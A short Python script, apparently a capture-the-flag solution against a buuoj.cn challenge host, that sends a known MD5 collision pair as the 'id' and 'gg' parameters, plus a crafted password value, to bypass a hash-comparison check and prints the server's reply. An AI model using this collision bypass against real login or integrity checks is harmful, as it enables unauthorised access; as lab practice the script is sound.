import requests, re
import hashlib
url = "http://ff628684-2b7e-4059-ac57-4c8f10623f33.node4.buuoj.cn:81/"

b1 = "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
b2 = "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"


payload = {"passwd" : "1234567a"}

id = bytes.fromhex(b1)
gg = bytes.fromhex(b2)

print(id)
print(gg)

print(hashlib.md5(id).digest())
print(hashlib.md5(gg).digest())

params={"id":id, "gg":gg}

get_result = requests.post(url, params=params, data=payload)

print(get_result)
print(get_result.text)
